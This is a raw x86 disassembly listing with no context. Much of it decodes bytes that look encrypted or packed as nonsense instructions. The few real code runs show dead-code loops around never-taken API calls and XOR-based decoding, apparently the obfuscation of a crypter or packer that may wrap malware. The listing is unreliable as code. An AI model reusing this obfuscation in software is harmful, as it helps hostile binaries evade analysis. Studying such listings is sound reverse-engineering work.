  408c63:	mov    edx,0x3f5b18a8
  408c68:	pop    ds
  408c69:	cmp    BYTE PTR [edx+0x420d038f],bl
  408c6f:	mov    esi,0x955481ea
  408c74:	popf   
  408c75:	cld    
  408c76:	jbe    0x408c63
  408c78:	sbb    cl,BYTE PTR [edx+0x39101545]
  408c7e:	fnsave [eax+0x36]
  408c81:	fnclex 
  408c83:	sub    eax,0x35ef741
  408c88:	push   edx
  408c89:	cmp    al,0xea
  408c8b:	push   esp
  408c8c:	ror    DWORD PTR [ebx-0x29fcf793],1
  408c92:	imul   edx,edi
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	das    
  408cb7:	cmp    al,0x6a
  408cb9:	mov    ss,WORD PTR [esp+ebx*8]
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	xor    DWORD PTR [eax-0x774be491],ecx
  408cc8:	mov    dh,0xf
  408cca:	in     eax,dx
  408ccb:	sahf   
  408ccc:	loop   0x408c50
  408cce:	xchg   DWORD PTR [ecx],ebp
  408cd0:	mov    ebp,0x48e21068
  408cd5:	lock push DWORD PTR [eax+0x6389465]
  408cdc:	and    DWORD PTR ss:[ebx],esi
  408cdf:	hlt    
  408ce0:	adc    eax,0x5fc438c5
  408ce5:	test   DWORD PTR [edx],edi
  408ce7:	mov    esi,0x84a5d70f
  408cec:	call   0x8f6c:0xd526a173
  408cf3:	xor    dh,cl
  408cf5:	scas   eax,DWORD PTR es:[edi]
  408cf6:	xlat   BYTE PTR ds:[ebx]
  408cf7:	and    ch,BYTE PTR [eax+ecx*4+0x76]
  408cfb:	inc    ebx
  408cfc:	int    0xd6
  408cfe:	pushf  
  408cff:	push   eax
  408d00:	sbb    ebp,DWORD PTR [esi-0x1b13675d]
  408d06:	push   esp
  408d07:	lods   eax,DWORD PTR ds:[esi]
  408d08:	das    
  408d09:	aad    0xb8
  408d0b:	int3   
  408d0c:	mov    bl,0xea
  408d0e:	sub    al,0xb5
  408d10:	jb     0x408d23
  408d12:	dec    eax
  408d13:	sbb    BYTE PTR [edx],bl
  408d15:	arpl   WORD PTR [ecx-0x4b],di
  408d18:	lods   eax,DWORD PTR ds:[esi]
  408d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d1a:	js     0x408d16
  408d1c:	inc    eax
  408d1d:	cs inc eax
  408d1f:	cmp    eax,edx
  408d21:	pop    ebp
  408d22:	mov    dh,0xc4
  408d24:	addr16 int 0x4b
  408d27:	mov    bl,0x7
  408d29:	hlt    
  408d2a:	cmc    
  408d2b:	lods   al,BYTE PTR ds:[esi]
  408d2c:	and    ch,BYTE PTR [ebx]
  408d2e:	rcr    BYTE PTR [esi+0x33],0xe2
  408d32:	test   esp,esp
  408d34:	add    al,0xea
  408d36:	add    eax,0x9ca1b73e
  408d3b:	jle    0x408d3f
  408d3d:	popa   
  408d3e:	and    bh,al
  408d40:	out    dx,eax
  408d41:	add    DWORD PTR [ebx+0x641ac3eb],ecx
  408d47:	mov    eax,0xcad0515f
  408d4c:	push   ecx
  408d4d:	dec    esi
  408d4e:	jmp    0x408d4f
  408d50:	das    
  408d51:	inc    eax
  408d52:	cli    
  408d53:	mov    ds:0xe262597b,al
  408d58:	pop    ds
  408d59:	sub    DWORD PTR [ecx],ebx
  408d5b:	into   
  408d5c:	add    dl,al
  408d5e:	push   eax
  408d5f:	lea    eax,ds:0x8ad806b5
  408d65:	mov    al,0xa6
  408d67:	jo     0x408d99
  408d69:	and    esi,DWORD PTR [eax]
  408d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d6c:	imul   ebp,DWORD PTR [esi+edi*4-0x13cbed47],0x164ef16b
  408d77:	push   edi
  408d78:	xchg   esp,eax
  408d79:	cld    
  408d7a:	jns    0x408d80
  408d7c:	scas   eax,DWORD PTR es:[edi]
  408d7d:	mov    esi,DWORD PTR [ebp-0x3628ce70]
  408d83:	ror    DWORD PTR [edi-0x2cb79832],1
  408d89:	popa   
  408d8a:	or     eax,0xdc1e9640
  408d8f:	or     edi,DWORD PTR [ebp-0x62e544b]
  408d95:	inc    eax
  408d96:	or     eax,0x9f15f964
  408d9b:	rol    ecx,cl
  408d9d:	jle    0x408dd4
  408d9f:	dec    edx
  408da0:	loopne 0x408d86
  408da2:	or     edx,ecx
  408da4:	xchg   BYTE PTR [edx+0x48],dh
  408da7:	mov    ds:0x6c8eb2f8,al
  408dac:	fcom   DWORD PTR [esi-0x5706536d]
  408db2:	sbb    al,0xea
  408db4:	dec    bp
  408db6:	xor    BYTE PTR [edx],ah
  408db8:	test   al,0x8e
  408dba:	call   0xcee2:0x6d53f1ac
  408dc1:	aaa    
  408dc2:	mov    bl,0x50
  408dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dc5:	xor    al,0xe8
  408dc7:	mov    al,ds:0x21785888
  408dcc:	adc    al,0x73
  408dce:	(bad)
  408dd1:	lock fucomi st,st(1)
  408dd4:	enter  0x9a20,0xc
  408dd8:	rol    BYTE PTR [ecx+0x26bb3f07],1
  408dde:	cli    
  408ddf:	test   al,0x76
  408de1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408de2:	mov    eax,fs:0x9c5213a2
  408de8:	push   ss
  408de9:	push   ecx
  408dea:	int    0x33
  408dec:	adc    ah,dh
  408dee:	and    BYTE PTR [ebp+ecx*1-0x4bf5662b],cl
  408df5:	pop    edx
  408df6:	repz dec edx
  408df8:	into   
  408df9:	in     al,0x24
  408dfb:	mov    eax,0xeb056e40
  408e00:	ror    esi,0xcc
  408e03:	(bad)  
  408e04:	xor    edi,DWORD PTR [edi-0x76]
  408e07:	jmp    0x5307:0x671f0e2a
  408e0e:	aam    0xf2
  408e10:	addr16 in eax,0xed
  408e13:	inc    ecx
  408e14:	call   0xe7b4:0x54ffed4c
  408e1b:	out    0xa0,al
  408e1d:	test   DWORD PTR [ebx],esp
  408e1f:	pop    esp
  408e20:	sbb    DWORD PTR [ebx+ecx*4+0x75cdab8],esi
  408e27:	ret    
  408e28:	dec    ax
  408e2a:	lods   al,BYTE PTR ds:[esi]
  408e2b:	pop    esi
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0x2d3ca697
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	inc    ebp
  408e68:	or     DWORD PTR [esi+0x157fc2ae],ebp
  408e6e:	dec    esi
  408e6f:	adc    BYTE PTR [ebx],ah
  408e71:	retf   0x223
  408e74:	fist   WORD PTR [eax]
  408e76:	xchg   DWORD PTR [ebp+0x6d],ebp
  408e79:	mov    esp,0x8f278049
  408e7e:	mov    dh,0xf7
  408e80:	adc    BYTE PTR [esi],ch
  408e82:	je     0x408e0a
  408e84:	push   ss
  408e85:	test   al,0xdb
  408e87:	cmc    
  408e88:	add    ah,ch
  408e8a:	cs ins BYTE PTR es:[edi],dx
  408e8c:	sub    BYTE PTR [edi+ecx*1-0x48b0118a],0x77
  408e94:	jge    0x408e84
  408e96:	mov    ch,0xfa
  408e98:	xor    eax,0x2a09c789
  408e9d:	out    dx,eax
  408e9e:	aaa    
  408e9f:	inc    edx
  408ea0:	lahf   
  408ea1:	aaa    
  408ea2:	(bad)  
  408ea3:	js     0x408e7c
  408ea5:	mov    al,ds:0x3abc22d2
  408eaa:	mov    dh,0xd7
  408eac:	mov    eax,ds:0x932e4772
  408eb1:	or     DWORD PTR [edi-0x6c],edi
  408eb4:	repnz fcom QWORD PTR [eax+0x6d]
  408eb8:	(bad)  [edi+esi*1]
  408ebb:	cmp    bl,cl
  408ebd:	or     dl,BYTE PTR [ecx+ebp*1-0x47]
  408ec1:	xor    esi,DWORD PTR [edx+0x1c]
  408ec4:	or     ebx,ebp
  408ec6:	idiv   ebx
  408ec8:	push   cs
  408ec9:	(bad)  
  408eca:	inc    edi
  408ecc:	retf   
  408ecd:	or     al,0x55
  408ecf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ed0:	mov    al,0x3d
  408ed2:	inc    esi
  408ed3:	push   cs
  408ed4:	arpl   dx,bp
  408ed6:	test   al,bl
  408ed8:	push   cs
  408ed9:	jmp    0x1dbf:0x27f72c3e
  408ee0:	push   edx
  408ee1:	in     eax,dx
  408ee2:	xchg   ebp,eax
  408ee3:	xchg   esi,eax
  408ee4:	xchg   ecx,eax
  408ee5:	in     al,dx
  408ee6:	mov    ebp,0xd14fbeb5
  408eeb:	jp     0x408f48
  408eed:	repnz mov dl,0xd5
  408ef0:	push   0x1687e14
  408ef5:	shr    BYTE PTR [edx+esi*8-0x39223d9f],0xad
  408efd:	pop    ss
  408efe:	inc    edx
  408eff:	(bad)  [edi+0x5]
  408f02:	scas   al,BYTE PTR es:[edi]
  408f03:	test   al,0x7e
  408f05:	std    
  408f06:	jg     0x408f65
  408f08:	scas   al,BYTE PTR es:[edi]
  408f09:	jp     0x408f12
  408f0b:	jmp    0xa85c134c
  408f10:	pop    ss
  408f11:	pop    esi
  408f12:	sbb    ebx,esp
  408f14:	pusha  
  408f15:	mov    ch,ch
  408f17:	sbb    edx,DWORD PTR [ecx+ecx*2-0x51]
  408f1b:	or     esp,DWORD PTR [ecx+0x74]
  408f1e:	mov    edx,0xef0f630e
  408f23:	jmp    0x408f2a
  408f25:	mov    edi,0xf97ac1bc
  408f2a:	and    esp,DWORD PTR [eax]
  408f2c:	push   ds
  408f2d:	dec    ecx
  408f2e:	jno    0x408f43
  408f30:	int3   
  408f31:	int    0x97
  408f33:	xor    DWORD PTR [esi+eiz*2+0xc],eax
  408f37:	outs   dx,BYTE PTR ds:[esi]
  408f38:	sub    ebx,DWORD PTR [eax]
  408f3a:	ja     0x408f96
  408f3c:	sub    al,dh
  408f3e:	lea    ecx,[ebx+0x59de1702]
  408f44:	inc    ebx
  408f45:	popf   
  408f46:	leave  
  408f47:	xchg   esp,eax
  408f48:	cld    
  408f49:	cmp    eax,0x47faa2ce
  408f4e:	xor    DWORD PTR [edi-0x7b49d4fb],esi
  408f54:	adc    DWORD PTR [eax-0x5a65e3d7],ecx
  408f5a:	or     dl,cl
  408f5c:	(bad)  
  408f5d:	jmp    0xc4297439
  408f62:	and    eax,0x208e7be2
  408f67:	and    al,0x4c
  408f69:	push   edx
  408f6a:	retf   
  408f6b:	ficom  WORD PTR [edx]
  408f6d:	add    BYTE PTR [ebx-0x6faa1823],0xd0
  408f74:	adc    esp,DWORD PTR [edx+0x1be3c4ce]
  408f7a:	imul   edx,DWORD PTR [eax+0x3f],0xf7442d2f
  408f81:	(bad)  
  408f83:	cli    
  408f84:	jmp    0x4f9f83da
  408f89:	test   al,0xcb
  408f8b:	add    eax,DWORD PTR [ebp+0x6]
  408f8e:	(bad)  
  408f8f:	aam    0x94
  408f91:	or     ah,BYTE PTR [ebp+0x64]
  408f94:	push   0x3178807a
  408f99:	scas   al,BYTE PTR es:[edi]
  408f9a:	inc    esp
  408f9b:	mov    ebx,0xf2ca38b2
  408fa0:	out    dx,eax
  408fa1:	std    
  408fa2:	pop    ecx
  408fa3:	mov    WORD PTR ds:0xc3ab8842,es
  408fa9:	dec    edi
  408faa:	cmp    bl,BYTE PTR [ecx]
  408fac:	pop    es
  408fad:	leave  
  408fae:	fcomp  DWORD PTR [edx]
  408fb0:	enter  0x36ac,0xae
  408fb4:	in     eax,dx
  408fb5:	pop    es
  408fb6:	outs   dx,DWORD PTR ds:[esi]
  408fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb8:	sbb    ecx,DWORD PTR [edi+eiz*4]
  408fbb:	rcl    DWORD PTR [ebp+0x50],1
  408fbe:	xchg   edi,eax
  408fbf:	retf   0x9a1a
  408fc2:	adc    al,0xb4
  408fc5:	dec    edx
  408fc6:	mov    WORD PTR [ecx+ebx*4-0x15],es
  408fca:	ins    BYTE PTR es:[edi],dx
  408fcb:	repnz pop ebp
  408fcd:	scas   eax,DWORD PTR es:[edi]
  408fce:	push   edx
  408fcf:	fild   QWORD PTR [ebx-0x7bf0c7c7]
  408fd5:	mov    cl,0xf5
  408fd7:	(bad)  
  408fd8:	(bad)  
  408fd9:	mov    eax,0x800f1c9a
  408fde:	jmp    0x4088e1
  408fe3:	push   ebp
  408fe4:	mov    ebp,esp
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4336af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4336af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4336af,ecx
  40900c:	cmp    DWORD PTR ds:0x4336af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4336af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4336eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4336eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4336eb,ecx
  409060:	cmp    DWORD PTR ds:0x4336eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43372f
  409072:	push   0x494f
  409077:	push   0x43379a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4336eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4336f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433703,0x43373b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433677,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4336c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4336db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4336a7,0x43362f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433627
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43373b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433613,0x17
  40910c:	cmp    DWORD PTR ds:0x433613,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433613,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433613
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433613,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4336a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	and    ecx,DWORD PTR [eax+ebp*8]
  409167:	fldenv [eax-0x26]
  40916a:	jle    0x4091ea
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	cmc    
  409171:	pop    esp
  409172:	aam    0x43
  409174:	jp     0x4091cc
  409176:	sub    eax,0x18e4ea65
  40917b:	retf   
  40917c:	mov    ebp,0xe40386d2
  409181:	xor    eax,0xe14c9cec
  409186:	and    DWORD PTR [esp+eiz*4],edx
  409189:	mov    ds:0x3a39b37a,eax
  40918e:	mov    WORD PTR [esi],gs
  409190:	sub    bl,dl
  409192:	popa   
  409193:	jno    0x4091cc
  409195:	mov    BYTE PTR [edi],dh
  409197:	shr    BYTE PTR [ebx],0xc6
  40919a:	xchg   esi,eax
  40919b:	out    0x79,al
  40919d:	stos   DWORD PTR es:[edi],eax
  40919e:	add    BYTE PTR [eax+0x1bafa0bf],cl
  4091a4:	jg     0x4091c1
  4091a6:	ins    BYTE PTR es:[edi],dx
  4091a7:	cdq    
  4091a8:	mov    edx,DWORD PTR [edi-0xae6f3b3]
  4091ae:	int    0xce
  4091b0:	ficomp DWORD PTR [ecx+0x2548ada9]
  4091b6:	mov    ds:0xdf348f0a,al
  4091bb:	ffree  st(4)
  4091bd:	mov    dh,0xef
  4091bf:	xlat   BYTE PTR ss:[ebx]
  4091c1:	cmp    eax,DWORD PTR [ebp+0x8]
  4091c4:	add    DWORD PTR [edx+0x2b9276cc],edx
  4091ca:	pop    ss
  4091cb:	mov    al,0x5e
  4091cd:	vshufps ymm1,ymm4,ymm3,0x93
  4091d2:	fimul  DWORD PTR [esi*2-0x5f4f3ff4]
  4091d9:	(bad)  
  4091da:	mov    esi,0x9962948e
  4091df:	test   eax,0xd8c6a7d
  4091e4:	sahf   
  4091e5:	loopne 0x4091ba
  4091e7:	or     DWORD PTR [ebp+0x5f],esp
  4091ea:	out    0xde,al
  4091ec:	dec    esi
  4091ed:	dec    esi
  4091ee:	and    DWORD PTR [edx+0x191c0e1],eax
  4091f4:	mov    eax,0x626b2bba
  4091f9:	pop    ebx
  4091fa:	(bad)  
  4091fb:	jmp    0x10b1:0x31041c5c
  409202:	test   eax,0xc1c7a928
  409207:	fidiv  DWORD PTR ds:0x7b57d500
  40920d:	mov    bl,0x8c
  40920f:	mov    ebx,0xe888b258
  409214:	popf   
  409215:	fs cwde 
  409217:	ja     0x40919d
  409219:	mov    bl,0xc6
  40921b:	jecxz  0x40927c
  40921d:	mov    eax,0xf4b4eef3
  409222:	cmp    dh,ah
  409224:	or     eax,DWORD PTR [esi-0x1b]
  409227:	xchg   esi,eax
  409228:	repnz sub dl,ch
  40922b:	xchg   ebp,eax
  40922c:	jecxz  0x409283
  40922e:	arpl   WORD PTR ds:0xc0c5d58f,cx
  409234:	xchg   BYTE PTR [ecx+0x63],ch
  409237:	sbb    dl,BYTE PTR [ebx-0x53]
  40923a:	dec    ebx
  40923b:	pop    ebp
  40923c:	xchg   ecx,eax
  40923d:	mov    esi,0x27b81908
  409242:	div    cl
  409244:	(bad)  
  409246:	pusha  
  409247:	outs   dx,DWORD PTR ds:[esi]
  409248:	mov    edi,0xe9f385c9
  40924d:	(bad)  
  40924e:	icebp  
  40924f:	sub    BYTE PTR [ebp+0x26],cl
  409252:	in     al,dx
  409253:	push   ebp
  409254:	fld    st(2)
  409256:	das    
  409257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409258:	stos   BYTE PTR es:[edi],al
  409259:	or     ebx,DWORD PTR [edi+0x624984e9]
  40925f:	xor    al,0xc8
  409261:	(bad)  
  409262:	test   al,0x23
  409264:	pop    esi
  409265:	cwde   
  409266:	xchg   ebp,eax
  409267:	repz inc esp
  409269:	(bad)  
  40926a:	fld    TBYTE PTR [ebx+0x36]
  40926d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40926e:	push   0x68
  409270:	jp     0x409292
  409272:	adc    DWORD PTR [edi],0x13
  409275:	xchg   cl,ah
  409277:	or     ch,ah
  409279:	aad    0xdc
  40927b:	jb     0x40923d
  40927d:	daa    
  40927e:	scas   al,BYTE PTR es:[edi]
  40927f:	icebp  
  409280:	sub    esp,DWORD PTR [edi+0x43]
  409283:	mov    edi,edi
  409285:	sub    BYTE PTR [eax+0x6d],0x8d
  409289:	cmp    al,bl
  40928b:	mov    esp,0x16939632
  409290:	sub    eax,0xbf4c3693
  409295:	cmp    dl,BYTE PTR [ebx-0x69ef1368]
  40929b:	lahf   
  40929c:	(bad)  
  40929e:	push   ebx
  40929f:	ror    BYTE PTR [ecx+esi*4-0x43a375c1],0x7c
  4092a7:	xchg   BYTE PTR [ebp-0x72],dl
  4092aa:	test   DWORD PTR [edi+0x447b0215],ebp
  4092b0:	adc    eax,ecx
  4092b2:	idiv   DWORD PTR [ecx+0x75]
  4092b5:	fcmove st,st(4)
  4092b7:	mov    eax,0x4490be5c
  4092bc:	aad    0xe
  4092be:	xchg   ebx,eax
  4092bf:	out    dx,al
  4092c0:	xor    al,0x90
  4092c2:	out    0x26,eax
  4092c4:	add    al,0x34
  4092c6:	sbb    BYTE PTR [edx-0x1e],bl
  4092c9:	xchg   ecx,eax
  4092ca:	pop    eax
  4092cb:	sub    edx,eax
  4092cd:	imul   BYTE PTR [esp+eiz*2]
  4092d0:	and    bl,ch
  4092d2:	or     BYTE PTR [ebx],dl
  4092d4:	out    0xfc,eax
  4092d6:	loopne 0x40930d
  4092d8:	aad    0xd1
  4092da:	xlat   BYTE PTR ds:[ebx]
  4092db:	daa    
  4092dc:	(bad)  
  4092dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092de:	jle    0x409352
  4092e0:	cmp    ecx,DWORD PTR [ebx+ebx*8+0x7040b093]
  4092e7:	ror    DWORD PTR [ecx+eax*4+0x5912853a],0xcc
  4092ef:	jb     0x409282
  4092f1:	sub    bh,BYTE PTR [eax+0x7e]
  4092f4:	fbstp  TBYTE PTR [esi-0x36]
  4092f7:	add    esi,DWORD PTR [ebp+0x68f4f4ce]
  4092fd:	pop    esp
  4092fe:	add    eax,0xdb5cfc61
  409303:	into   
  409304:	gs or  al,0x7
  409307:	ret    0x3490
  40930a:	mov    bl,0x9f
  40930c:	daa    
  40930d:	test   eax,0x1a09e07f
  409312:	push   ds
  409313:	inc    edx
  409314:	(bad)  
  409315:	(bad)  
  409316:	mov    ds:0x22357c9a,al
  40931b:	pop    esi
  40931c:	pop    eax
  40931d:	push   ebp
  40931e:	jge    0x409377
  409320:	jg     0x40936e
  409322:	aad    0x3f
  409324:	or     al,0x96
  409326:	xlat   BYTE PTR ds:[ebx]
  409327:	add    bh,bl
  409329:	pop    edx
  40932a:	xchg   esp,eax
  40932b:	mov    dh,BYTE PTR [edx]
  40932d:	(bad)  
  40932e:	(bad)  
  409330:	sbb    eax,0xa02e9a35
  409335:	pop    es
  409336:	js     0x409311
  409338:	inc    ebx
  409339:	mov    edi,0xdcd04c70
  40933e:	cmp    eax,0x382b0d9
  409343:	mov    cl,0x4f
  409345:	inc    ecx
  409346:	nop
  409347:	aad    0x21
  409349:	cdq    
  40934a:	mov    BYTE PTR [ebx],ch
  40934c:	dec    ebx
  40934d:	stos   DWORD PTR es:[edi],eax
  40934e:	sub    al,0xe8
  409350:	call   0xdfccd106
  409355:	imul   eax,DWORD PTR [ebp+0x3c8b9b6f],0x2
  40935c:	pop    eax
  40935d:	mov    ah,0xdd
  40935f:	push   ebp
  409360:	outs   dx,BYTE PTR ds:[esi]
  409361:	adc    DWORD PTR [ecx-0x3c],ecx
  409364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409365:	(bad)  
  409367:	fwait
  409368:	loopne 0x4093af
  40936a:	sbb    BYTE PTR [esi+edi*8-0x4d],al
  40936e:	xacquire xchg BYTE PTR gs:[edx-0x198cf193],bl
  409376:	mov    al,0xc2
  409378:	pop    esp
  409379:	hlt    
  40937a:	mov    cl,0x5f
  40937c:	addr16 pop ds
  40937e:	stos   DWORD PTR es:[edi],eax
  40937f:	aam    0x26
  409381:	xchg   ebp,eax
  409382:	je     0x409368
  409384:	jg     0x40939c
  409386:	adc    al,0x74
  409388:	pop    es
  409389:	scas   eax,DWORD PTR es:[edi]
  40938a:	xchg   edx,eax
  40938b:	sbb    esp,DWORD PTR [esp+eiz*8-0x66a2264c]
  409392:	out    dx,eax
  409393:	enter  0x8a3c,0xf0
  409397:	pop    esi
  409398:	imul   esp,esp,0xaf413e42
  40939e:	sub    BYTE PTR [eax],dh
  4093a0:	add    eax,0xe8404419
  4093a5:	dec    edi
  4093a6:	in     al,0x51
  4093a8:	mov    dh,0x7c
  4093aa:	push   esp
  4093ab:	loope  0x4093df
  4093ad:	popa   
  4093ae:	fimul  WORD PTR [eax]
  4093b0:	in     al,0x45
  4093b2:	leave  
  4093b3:	and    al,0x35
  4093b5:	mov    ebp,eax
  4093b7:	inc    edx
  4093b8:	cdq    
  4093b9:	or     al,0xa
  4093bb:	dec    esp
  4093bc:	es (bad) 
  4093be:	and    al,0x58
  4093c0:	(bad)  
  4093c1:	or     al,0x84
  4093c3:	addr16 push esp
  4093c5:	xchg   ebp,eax
  4093c6:	mov    esi,0x5841cd36
  4093cb:	jge    0x40939b
  4093cd:	ins    DWORD PTR es:[edi],dx
  4093ce:	fs dec ebp
  4093d0:	jmp    0x4093e0
  4093d2:	push   edx
  4093d3:	fimul  DWORD PTR [eax]
  4093d5:	hlt    
  4093d6:	retf   
  4093d7:	clc    
  4093d8:	xor    DWORD PTR [edx-0x1550987],ebp
  4093de:	fisubr DWORD PTR [ebx-0x20]
  4093e1:	xchg   esi,eax
  4093e2:	inc    esi
  4093e3:	jno    0x409430
  4093e5:	sub    esp,ebx
  4093e7:	out    0xfe,eax
  4093e9:	push   0x46052bf
  4093ee:	stos   BYTE PTR es:[edi],al
  4093ef:	add    BYTE PTR [ebx-0x7f7b2b62],cl
  4093f5:	xor    DWORD PTR [edi+0x1b0c0fc5],esi
  4093fb:	jns    0x409452
  4093fd:	jne    0x409420
  4093ff:	xlat   BYTE PTR ds:[ebx]
  409400:	or     cl,BYTE PTR [esi-0x145d8191]
  409406:	pop    esp
  409407:	les    ebx,FWORD PTR [ecx+0x13]
  40940a:	cmp    BYTE PTR [edi-0x21ed47cf],0x7
  409411:	push   ebx
  409412:	cmc    
  409413:	push   edi
  409414:	jnp    0x409461
  409416:	mov    eax,ds:0x77e8a766
  40941b:	and    BYTE PTR [ecx],bl
  40941d:	xchg   ecx,eax
  40941e:	iret   
  40941f:	sahf   
  409420:	fisttp WORD PTR [esp+ecx*8-0x6c8c637e]
  409427:	sub    al,0x96
  409429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40942a:	cld    
  40942b:	add    ecx,DWORD PTR [ecx+0x3a]
  40942e:	cmp    BYTE PTR [edi+0x71],bh
  409431:	aas    
  409432:	jmp    0x7595:0x87ef9e9
  409439:	mov    cl,0x2b
  40943b:	pop    esp
  40943c:	sbb    eax,0xe0e811eb
  409441:	inc    BYTE PTR [ecx]
  409443:	scas   eax,DWORD PTR es:[edi]
  409444:	push   esi
  409445:	in     al,0xb9
  409447:	clc    
  409448:	mov    ds:0x333ee619,al
  40944d:	jne    0x40948c
  40944f:	add    al,0x2b
  409451:	push   0x2d
  409453:	or     DWORD PTR [edi+0x181eb343],0xffffff9a
  40945a:	xchg   esp,eax
  40945b:	fisub  WORD PTR [ecx+0x6b]
  40945e:	ror    DWORD PTR [ecx],cl
  409460:	in     al,dx
  409461:	int    0xf1
  409463:	add    DWORD PTR [edi],0x50bf2063
  409469:	retf   
  40946a:	add    edi,esp
  40946c:	adc    esi,DWORD PTR [edi]
  40946e:	push   ecx
  40946f:	and    ecx,eax
  409471:	out    dx,al
  409472:	ror    dh,cl
  409474:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  40947b:	and    DWORD PTR ds:0x43372b,0x0
  409485:	xor    ecx,ecx
  409487:	add    ecx,DWORD PTR ds:0x43372b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43372b,ecx
  409494:	cmp    DWORD PTR ds:0x43372b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43372b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433613,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433677,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433677
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433677,ebx
  4094f1:	cmp    DWORD PTR ds:0x433677,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433677,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
